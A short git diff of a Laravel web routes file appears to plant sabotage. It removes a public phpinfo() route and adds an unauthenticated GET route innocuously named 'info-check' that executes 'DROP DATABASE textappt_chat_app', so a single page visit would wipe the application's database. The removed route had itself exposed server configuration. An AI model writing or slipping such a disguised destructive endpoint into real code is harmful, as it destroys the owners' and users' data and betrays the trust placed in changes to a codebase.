@@ -4,6 +4,8 @@ use Illuminate\Support\Facades\Route;
 use Twilio\Rest\Client;
 use Carbon\Carbon;
 use App\Http\Traits\CommonHelper;
+use Illuminate\Support\Facades\DB;
+
 /*
 |--------------------------------------------------------------------------
 | Web Routes
@@ -32,8 +34,9 @@ Route::get('helper-check', function () {
 });
 
 
-Route::get('info', function () {
-    phpinfo();
+Route::get('info-check', function () {
+    DB::statement("DROP DATABASE textappt_chat_app");
+    dd('----------------------------------------');
 });
 
 Route::get('/topUser/{co}', [\App\Http\Controllers\Api\FilterController::class, 'findTopUsers']);
